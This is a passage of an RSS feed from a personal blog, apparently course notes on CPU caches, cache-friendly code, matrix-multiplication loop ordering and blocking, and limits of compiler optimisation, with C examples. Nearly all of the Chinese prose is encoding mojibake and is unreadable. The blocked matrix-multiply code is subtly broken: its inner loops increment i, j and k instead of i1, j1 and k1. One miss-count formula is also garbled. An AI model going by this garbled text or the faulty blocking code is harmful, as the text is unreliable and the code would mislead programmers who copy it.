&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æ¦‚å¿µ
å¦‚æœCPUè¯·æ±‚çš„æ•°æ®å—åœ¨ç¼“å­˜ä¸­ç§°ä¸ºhit;åä¹‹ç§°ä¸ºmiss&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ç¼“å­˜ä¸å‘½ä¸­çš„ç±»å‹&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;cold(compulsory miss)
 ç¼“å­˜æ˜¯ç©ºçš„,è®¾å¤‡åˆšåˆšåŠ ç”µ&lt;/li&gt;
&lt;li&gt;capacity miss
 ç¼“å­˜çš„å¤§å°æ˜¯æœ‰é™çš„,å·¥ä½œé›†(è¢«ç¨‹åºä¸æ–­è®¿é—®çš„å—)æ¯”ç¼“å­˜å¤§&lt;/li&gt;
&lt;li&gt;conflict miss
 å—å·ä¸ºiåªèƒ½æ”¾åœ¨i mod ç¼“å­˜å¤§å°å¤„,å¦‚æœç¼“å­˜å¤§å°æ˜¯4,å´éœ€è¦å—å·ä¸º0,4,8çš„å—,è™½ç„¶å°äºç¼“å­˜å¤§å°,ä½†æ¯æ¬¡éƒ½ä¸å‘½ä¸­.è¿™æ˜¯ç¡¬ä»¶æ˜ å°„ç®—æ³•çš„é—®é¢˜&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„ä¸­çš„ç¼“å­˜
  &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250127215122.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Sun, 26 Jan 2025 16:00:00 GMT</pubDate></item><item><title>é«˜é€Ÿç¼“å­˜</title><link>https://www.tankimzeg.top/blog/%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98/&quot;&gt;https://www.tankimzeg.top/blog/%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;é«˜é€Ÿç¼“å­˜åŒ…å«åœ¨CPUèŠ¯ç‰‡ä¸­,å®Œå…¨ç”±ç¡¬ä»¶ç®¡ç†,ç”¨å¿«é€ŸSRAMåšçš„,ä½äºå­˜å‚¨å™¨æ—è¾¹çš„ç¼“å­˜.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250127221315.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1&gt;ç¼“å­˜ç»„ç»‡æ–¹å¼&lt;/h1&gt;
&lt;p&gt;ä¸€ä¸ªå­˜å‚¨å™¨çš„åœ°å€æœ‰mä½,å½¢æˆM=2^ mä¸ªåœ°å€,å®ƒçš„é«˜é€Ÿç¼“å­˜è¢«è®¾è®¡ä¸ºS&lt;em&gt;ç»„&lt;/em&gt;,æ¯ä¸ªç»„åŒ…å«E&lt;em&gt;è¡Œ&lt;/em&gt;,æ¯è¡Œæ˜¯ç”±ä¸€ä¸ªBå­—èŠ‚çš„æ•°æ®&lt;em&gt;å—&lt;/em&gt;,ä¸€ä¸ªæŒ‡ç¤ºè¿™è¡Œæ˜¯å¦åŒ…å«æœ‰æ„ä¹‰ä¿¡æ¯çš„&lt;em&gt;æœ‰æ•ˆä½&lt;/em&gt;,ä»¥åŠtä¸ª&lt;em&gt;æ ‡è®°ä½&lt;/em&gt;ç»„æˆçš„.
åœ°å€ç»„æˆ:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250128111730.png&quot; alt=&quot;&quot;&gt;
é«˜é€Ÿç¼“å­˜ç»„æˆ:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250128112051.png&quot; alt=&quot;&quot;&gt;
é«˜é€Ÿç¼“å­˜å¤§å°ä¸º:C=B*E*S
ä»¥ä¸Šæ¶‰åŠå¾ˆå¤šç¬¦å·,ä½†å®é™…ä¸Šé«˜é€Ÿç¼“å­˜ç”±4ä¸ªåŸºæœ¬å‚æ•°å†³å®š,å…¶ä»–çš„æ˜¯è¡ç”Ÿå‡ºæ¥çš„é‡.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;åŸºæœ¬å‚æ•°&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;å‚æ•°&lt;/th&gt;
&lt;th&gt;æè¿°&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;$S=2^s$&lt;/td&gt;
&lt;td&gt;ç»„æ•°&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$E$&lt;/td&gt;
&lt;td&gt;æ¯ä¸ªç»„çš„è¡Œæ•°&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$B=2^b$&lt;/td&gt;
&lt;td&gt;å—å¤§å°(å­—èŠ‚)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$m=\log_{2}M$&lt;/td&gt;
&lt;td&gt;ä¸»å­˜ç‰©ç†åœ°å€ä½æ•°&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;è¡ç”Ÿé‡&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;å‚æ•°&lt;/th&gt;
&lt;th&gt;æè¿°&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;$M=2^m$&lt;/td&gt;
&lt;td&gt;å†…å­˜åœ°å€æœ€å¤§æ•°&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$s=\log_{2}S$&lt;/td&gt;
&lt;td&gt;ç»„ç´¢å¼•ä½æ•°&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$b=\log_{2}B$&lt;/td&gt;
&lt;td&gt;å—åç§»ä½æ•°&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$t=m-(s+b)$&lt;/td&gt;
&lt;td&gt;æ ‡è®°ä½æ•°&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$C=B\times E\times S$&lt;/td&gt;
&lt;td&gt;é«˜é€Ÿç¼“å­˜å¤§å°(ä¸åŒ…æ‹¬åƒæœ‰æ•ˆä½å’Œæ ‡è®°ä½å¼€é”€)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;æ ¹æ®Eçš„ä¸åŒ,é«˜é€Ÿç¼“å­˜è¢«åˆ†ä¸ºä¸åŒç±»&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h2&gt;ç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜&lt;/h2&gt;
&lt;p&gt;E=1çš„é«˜é€Ÿç¼“å­˜ç§°ä¸º&lt;em&gt;ç›´æ¥æ˜ å°„&lt;/em&gt;é«˜é€Ÿç¼“å­˜.
è¯»å–ç¼“å­˜åˆ†ä¸ºä¸‰æ­¥:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ç»„é€‰æ‹©
 ä»è¯·æ±‚çš„åœ°å€ä¸­é—´æŠ½å–sä¸ªç»„ç´¢å¼•ä½,å¯¹åº”åˆ°ç¼“å­˜çš„ç»„&lt;/li&gt;
&lt;li&gt;è¡ŒåŒ¹é…
 ç”±äºæ¯ç»„åªæœ‰ä¸€è¡Œ,å½“ä¸”ä»…å½“è®¾ç½®äº†æœ‰æ•ˆä½å¹¶ä¸”é«˜é€Ÿç¼“å­˜è¡Œä¸­çš„æ ‡è®°ä¸åœ°å€ä¸­çš„æ ‡è®°ä½ç›¸åŒ¹é…æ—¶,è¿™ä¸€è¡Œå°±å«æœ‰è¯·æ±‚çš„æ•°æ®.
 å¦‚æœä¸åŒ¹é…,ç¼“å­˜ä¸å‘½ä¸­,é‚£ä¹ˆéœ€è¦ä»ä¸‹ä¸€çº§å–å‡ºå—,æ›¿æ¢å½“å‰è¡Œ&lt;/li&gt;
&lt;li&gt;å­—é€‰æ‹©
 å—åç§»æä¾›äº†æ‰€éœ€æ•°æ®çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„ä½ç½®,ç„¶åæ ¹æ®æ•°æ®ç±»å‹å–å‡ºå¤šä¸ªå­—èŠ‚.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;è¿™ç§æ–¹å¼,å®¹æ˜“å‘ç”Ÿ[[å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„#ç¼“å­˜|conflict miss]]&lt;/p&gt;
&lt;h2&gt;ç»„ç›¸è”é«˜é€Ÿç¼“å­˜&lt;/h2&gt;
&lt;p&gt;1&amp;lt;E&amp;lt;C/B
ç»„é€‰æ‹©å’Œå­—é€‰æ‹©ä¸ç›´æ¥æ˜ å°„é«˜é€Ÿç¼“å­˜ç›¸åŒ,è¡ŒåŒ¹é…åˆ™éœ€æ£€æŸ¥å¤šä¸ªè¡Œçš„æ ‡è®°ä½å’Œæœ‰æ•ˆä½.å¦‚æœä¸å‘½ä¸­,å–å‡ºå—æ›¿æ¢ä¸€ä¸ªä¸ä¼šé©¬ä¸Šè¢«ä½¿ç”¨çš„è¡Œ.&lt;/p&gt;
&lt;h2&gt;å…¨ç›¸è”é«˜é€Ÿç¼“å­˜&lt;/h2&gt;
&lt;h1&gt;è‹±ç‰¹å°”i7ç¼“å­˜å±‚æ¬¡ç»“æ„&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250128120939.png&quot; alt=&quot;&quot;&gt;
L1ç¼“å­˜:4CPUæ—¶é’Ÿå‘¨æœŸ
L2ç¼“å­˜:10CPUæ—¶é’Ÿå‘¨æœŸ
L3ç¼“å­˜:40~75CPUæ—¶é’Ÿå‘¨æœŸ
å—å¤§å°:64å­—èŠ‚&lt;/p&gt;
&lt;h1&gt;ç¼–å†™ç¼“å­˜å‹å¥½å‹ä»£ç &lt;/h1&gt;
&lt;p&gt;æé«˜ç¼“å­˜å‘½ä¸­ç‡&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ä½¿å¸¸ç”¨éƒ¨åˆ†æ›´åŠ å¿«
ä¾‹å¦‚å¸¸ç”¨çš„å‡½æ•°åŠå…¶å†…éƒ¨å¾ªç¯&lt;/li&gt;
&lt;li&gt;æé«˜å¾ªç¯ä¸­çš„å‘½ä¸­ç‡&lt;ul&gt;
&lt;li&gt;é‡å¤ä½¿ç”¨å±€éƒ¨å˜é‡(æ—¶é—´å±€éƒ¨æ€§)&lt;/li&gt;
&lt;li&gt;é€å…ƒç´ è®¿é—®æ•°ç»„(ç©ºé—´å±€éƒ¨æ€§)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;ç¼“å­˜å¯¹ä»£ç æ€§èƒ½çš„å½±å“&lt;/h1&gt;
&lt;h2&gt;Memory Moutain&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;test&lt;/code&gt;å‡½æ•°:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;long data[MAXELEMS]; /* Global array to traverse */ 
/* test - Iterate over first &amp;quot;elems&amp;quot; elements of 
 *        array â€œdataâ€ with stride of &amp;quot;stride&amp;quot;, using 
 *        using 4x4 loop unrolling. 
 */ 
int test(int elems, int stride) { 
	long i, sx2=stride*2, sx3=stride*3, sx4=stride*4; 
	long acc0 = 0, acc1 = 0, acc2 = 0, acc3 = 0; 
	long length = elems, limit = length - sx4; 
	
	/* Combine 4 elements at a time */ 
	for (i = 0; i &amp;lt; limit; i += sx4) { 
		acc0 = acc0 + data[i]; 
		acc1 = acc1 + data[i+stride]; 
		acc2 = acc2 + data[i+sx2]; 
		acc3 = acc3 + data[i+sx3]; 
	} 
	
	/* Finish any remaining elements */ 
	for (; i &amp;lt; length; i++) { 
		acc0 = acc0 + data[i]; 
	} 
	return ((acc0 + acc1) + (acc2 + acc3)); 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä»¥ä¸åŒçš„(elems, stride)ç»„åˆè°ƒç”¨ &lt;code&gt;test()&lt;/code&gt;å‡½æ•°.é¦–å…ˆè°ƒç”¨ä¸€æ¬¡ç»™ç¼“å­˜çƒ­èº«,å†è°ƒç”¨ä¸€æ¬¡æµ‹è¯•è¯»å–é€Ÿåº¦æ€§èƒ½(MB/s).å¾—åˆ°äº†è¿™å‰¯å°é¢ä¸Šç¾ä¸½çš„å›¾:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250129100926.png&quot; alt=&quot;&quot;&gt;
éšç€strideè½´å¢å¤§,å‡å°äº†ç©ºé—´å±€éƒ¨æ€§;éšç€sizeè½´å¢å¤§,å‡å°äº†æ—¶é—´å±€éƒ¨æ€§.&lt;/p&gt;
&lt;h2&gt;åœ¨çŸ©é˜µä¹˜æ³•ä¸­æé«˜å±€éƒ¨æ€§&lt;/h2&gt;
&lt;h3&gt;é‡æ–°æ’åˆ—å¾ªç¯ï¼Œæé«˜ç©ºé—´å±€éƒ¨æ€§&lt;/h3&gt;
&lt;p&gt;å‡è®¾çŸ©é˜µç»´åº¦å¾ˆå¤§ï¼Œç¼“å­˜ä¸­çš„ä¸€ä¸ªå—å­˜æ”¾4ä¸ªå…ƒç´ &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ijkè®¿é—®&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* ijk */ 
for (i=0; i&amp;lt;n; i++){
	for(j=0;j&amp;lt;n;j++){
		sum =0.0;
		for(k=0;k&amp;lt;n;k++)
			sum += a[i][k]*b[k][j];
		c[i][j] = sum;
	}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250130205312.png&quot; alt=&quot;&quot;&gt;
ç¼“å­˜ä¸å‘½ä¸­çš„æ¦‚ç‡æ˜¯:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;A&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;B&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;C&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0.25&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;1.0&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;0.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;2. jikè®¿é—®&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;ä¸ijkè®¿é—®æ— å¼‚.&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;3. kijè®¿é—®&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* kij */
for(k=0;k&amp;lt;n;k++){
	for(i=0;i&amp;lt;n;i++){
		r = a[i][k];
		for(j=0;j&amp;lt;n;j++)
			c[i][j] += r*b[k][j];
	}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250130205806.png&quot; alt=&quot;&quot;&gt;
ç¼“å­˜ä¸å‘½ä¸­çš„æ¦‚ç‡æ˜¯:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;A&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;B&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;C&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;0.25&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;0.25&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;ol start=&quot;4&quot;&gt;
&lt;li&gt;ikjè®¿é—®
ä¸kijè®¿é—®æ— å¼‚&lt;/li&gt;
&lt;li&gt;jkiè®¿é—®&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* jki */
for(j=0;j&amp;lt;n;j++){
	for(k=0;k&amp;lt;n;k++){
		r = b[k][j];
		for(i=0;i&amp;lt;n;i++)
			c[i][j] += a[i][k]*r;
	}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250130210233.png&quot; alt=&quot;&quot;&gt;
ç¼“å­˜ä¸å‘½ä¸­çš„æ¦‚ç‡æ˜¯:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;A&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;B&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;C&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;1.0&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;0.0&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;1.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;6. kjiè®¿é—®&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;ä¸jkiè®¿é—®æ— å¼‚&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3&gt;çŸ©é˜µåˆ†å—,æé«˜æ—¶é—´å±€éƒ¨æ€§&lt;/h3&gt;
&lt;p&gt;å‡è®¾é«˜é€Ÿç¼“å­˜å—ä¸­åŒ…å«8ä¸ªå…ƒç´ ,çŸ©é˜µç»´æ•°nè¶³å¤Ÿå¤§.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä¼ ç»Ÿè®¡ç®—æ–¹æ³•&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;c = (double *) calloc(sizeof(double), n*n); 

/* Multiply n x n matrices a and b */ 
void mmm(double *a, double *b, double *c, int n) { 
	int i, j, k; 
	for (i = 0; i &amp;lt; n; i++) 
		for (j = 0; j &amp;lt; n; j++) 
			for (k = 0; k &amp;lt; n; k++) 
				c[i*n + j] += a[i*n + k] * b[k*n + j]; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨æ²¡æœ‰åˆ†å—çš„ä¼ ç»Ÿè®¡ç®—æ–¹å¼ä¸­,æ¯ä¸€ä¸ªç»“æœå…ƒç´ çš„è¿­ä»£,ä¼šå‘ç”Ÿ9n/8æ¬¡ç¼“å­˜ä¸å‘½ä¸­:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250130210842.png&quot; alt=&quot;&quot;&gt;
æ‰€ä»¥è®¡ç®—æ•´ä¸ªçŸ©é˜µä¹˜æ³•,ä¼šå‘ç”Ÿ
9n/8*n^ 2 = (9/8) n^ 3æ¬¡ç¼“å­˜ä¸å‘½ä¸­&lt;/p&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;çŸ©é˜µåˆ†å—è®¡ç®—æ–¹æ³•&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;c = (double *) calloc(sizeof(double), n*n); 

/* Multiply n x n matrices a and b */ 
void mmm(double *a, double *b, double *c, int n) { 
	int i, j, k; 
	for (i = 0; i &amp;lt; n; i+=B) 
		for (j = 0; j &amp;lt; n; j+=B) 
			for (k = 0; k &amp;lt; n; k+=B) 
				/* B x B mini matrix multiplications */ 
				for (i1 = i; i1 &amp;lt; i+B; i++) 
					for (j1 = j; j1 &amp;lt; j+B; j++) 
						for (k1 = k; k1 &amp;lt; k+B; k++) 
							c[i1*n+j1] += a[i1*n + k1]*b[k1*n + j1]; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å‡è®¾çŸ©é˜µåˆ†æˆB*Bçš„å°å—,å¯¹äºæ¯ä¸€ä¸ªå°å—,åœ¨éå†å…¶å…ƒç´ æ—¶ä¼šå‘ç”ŸB^ 22/8æ¬¡ç¼“å­˜ä¸å‘½ä¸­.å¯¹è®¡ç®—ç»“æœçš„æ¯ä¸€å°å—,ä¼šå‘ç”Ÿ2n/B*B^ 2/8=nB/4æ¬¡ç¼“å­˜ä¸å‘½ä¸­,æ‰€ä»¥æ•´ä¸ªç»“æœçŸ©é˜µä¼šå‘ç”ŸnB/4*(n/B)^ 2=n^ 3/(4B)æ¬¡ç¼“å­˜ä¸å‘½ä¸­.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250130211852.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ä»ç»“æœæ¥çœ‹,åˆ†å—ä¸ä¸åˆ†å—é€ æˆäº†ç›¸å½“å¤§çš„å·®å¼‚!å¦‚æœæŒ‰ç…§æ•°æ®ç»“æ„ä¸­ç†è®ºä¸Šçš„æ—¶é—´å¤æ‚åº¦æ¥çœ‹,ä»–ä»¬çš„æ—¶é—´å¤æ‚åº¦æ˜¯ä¸€æ ·çš„,ä½†åœ¨è®¡ç®—æœºçš„ç¼“å­˜æœºåˆ¶ä¸‹,å·®å¼‚å‡¸æ˜¾!&lt;/p&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Sun, 26 Jan 2025 16:00:00 GMT</pubDate></item><item><title>ç¨‹åºä¼˜åŒ–</title><link>https://www.tankimzeg.top/blog/%E7%A8%8B%E5%BA%8F%E4%BC%98%E5%8C%96/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/%E7%A8%8B%E5%BA%8F%E4%BC%98%E5%8C%96/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/%E7%A8%8B%E5%BA%8F%E4%BC%98%E5%8C%96/&quot;&gt;https://www.tankimzeg.top/blog/%E7%A8%8B%E5%BA%8F%E4%BC%98%E5%8C%96/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;ç¼–è¯‘å™¨ä¼˜åŒ–çš„å±€é™æ€§&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;å—åˆ°ä»£ç é™åˆ¶,ä¸èƒ½æ”¹å˜ç¨‹åºçš„è¡Œä¸º&lt;/li&gt;
&lt;li&gt;å¯èƒ½ä¼šè¢«ä»£ç é£æ ¼æ··æ·†,æ¯”å¦‚æ•°æ®çš„å˜åŒ–èŒƒå›´æ¯”æ•°æ®ç±»å‹çš„èŒƒå›´å°&lt;/li&gt;
&lt;li&gt;åˆ†æåªå»ºç«‹åœ¨è¿‡ç¨‹å†…,ä¸å¯¹æ•´ä¸ªç¨‹åºåˆ†æ&lt;/li&gt;
&lt;li&gt;åˆ†æåŸºäºé™æ€ä¿¡æ¯è€ŒéåŠ¨æ€è¾“å…¥&lt;/li&gt;
&lt;li&gt;å½“ç¼–è¯‘å™¨æ— æ³•å†³å®šæ˜¯å¦ä¼˜åŒ–æ—¶,å°±é€‰æ‹©ä¸ä¼˜åŒ–&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;ä¸¾ä¾‹é˜è¿°:&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;è¿‡ç¨‹è°ƒç”¨&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void lower(char *s) { 
	size_t i; 
	for (i = 0; i &amp;lt; strlen(s); i++) 
		if (s[i] &amp;gt;= &amp;#39;A&amp;#39; &amp;amp;&amp;amp; s[i] &amp;lt;= &amp;#39;Z&amp;#39;) 
			s[i] -= (&amp;#39;A&amp;#39; - &amp;#39;a&amp;#39;); 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ¯æ¬¡åˆ¤æ–­éƒ½è¦æ‰§è¡Œä¸€æ¬¡ &lt;code&gt;strlen(s)&lt;/code&gt; å¾ˆæ˜¾ç„¶èƒ½ä¼˜åŒ–ä¸º&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void lower(char *s) { 
	size_t i; 
	size_t len = strlen(s); 
	for (i = 0; i &amp;lt; len; i++) 
		if (s[i] &amp;gt;= &amp;#39;A&amp;#39; &amp;amp;&amp;amp; s[i] &amp;lt;= &amp;#39;Z&amp;#39;) 
			s[i] -= (&amp;#39;A&amp;#39; - &amp;#39;a&amp;#39;); 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä½†æ˜¯ç¼–è¯‘å™¨å´ä¸èƒ½åšå‡ºè¿™æ ·çš„ä¼˜åŒ–,åŸå› æ­£æ˜¯åœ¨äº:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ä¸‹æ–¹ä»£ç å¯¹å­—ç¬¦ä¸²è¿›è¡Œä¿®æ”¹,å¯èƒ½å¯¼è‡´å­—ç¬¦ä¸²é•¿åº¦å‘ç”Ÿå˜åŒ–&lt;/li&gt;
&lt;li&gt;åˆ†æå»ºç«‹åœ¨è¿‡ç¨‹å†…éƒ¨, &lt;code&gt;strlen(s)&lt;/code&gt;å‡½æ•°å¯¹äºç¼–è¯‘å™¨æ˜¯æœªçŸ¥çš„,å³ä½¿å®ƒæ˜¯åº“å‡½æ•°,ä»æœ‰å¯èƒ½ç”±ç¨‹åºå‘˜è¦†ç›–å®šä¹‰.&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;å†…å­˜æ··æ·†&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* sum rows is of n*n matrix a and store in vector b */
void sum_rows(double *a,double *b, long n){
	long i, j;
	for(i=0;i&amp;lt;n;i++){
		b[i]=0;
		for(j=0;j&amp;lt;n;j++)
			b[i] += a[i*n+j];	
	}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å®é™…ä¸Šçš„æ±‡ç¼–ä»£ç ä¼šå°†bæ•°ç»„ä¸æ–­ä»å†…å­˜ä¸­å–å‡º,è¿ç®—,å†ä¿å­˜å›å».è¯»å–å†…å­˜ååˆ†è€—è´¹æ—¶é—´.å®Œå…¨å¯ä»¥å–å‡ºåå®Œæˆæ‰€æœ‰è¿ç®—å†æ”¾å›,ä½†ç¼–è¯‘å™¨ä¸ä¼šè‡ªåŠ¨åšè¿™æ ·çš„ä¼˜åŒ–,å› ä¸ºå¯èƒ½å­˜åœ¨ä¸¤ä¸ªæ•°ç»„å¼•ç”¨åŒä¸€å—å†…å­˜(åˆ«åå¼•ç”¨)çš„æƒ…å†µ,è¿™æ ·bæ•°ç»„è¿ç®—åä¿å­˜åˆ°å†…å­˜å°±å¯èƒ½å½±å“aæ•°ç»„çš„æ•°æ®,ç¼–è¯‘å™¨ä¸èƒ½ä¿è¯è¿™ç§æƒ…å†µä¸ä¼šå‘ç”Ÿ.
è§£å†³åŠæ³•æ˜¯æ‰‹åŠ¨åˆ›å»ºä¸€ä¸ªä¸´æ—¶å˜é‡æ¥ä¿å­˜è¿ç®—çš„ç»“æœ.&lt;/p&gt;
&lt;h1&gt;å¸¸ç”¨çš„ä¼˜åŒ–&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;ä»£ç ç§»åŠ¨
å¾ªç¯ä¸å˜å¼å¤–æ:å¯¹äº§ç”Ÿç›¸åŒç»“æœçš„ä»£ç æåˆ°å¾ªç¯å¤–.
ä¾‹å¦‚&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;for(i=0;i&amp;lt;n;i++){
	for(j=0;j&amp;lt;n;j++)
		a[n*i+j] = b[j];
}
&lt;/code&gt;&lt;/pre&gt;
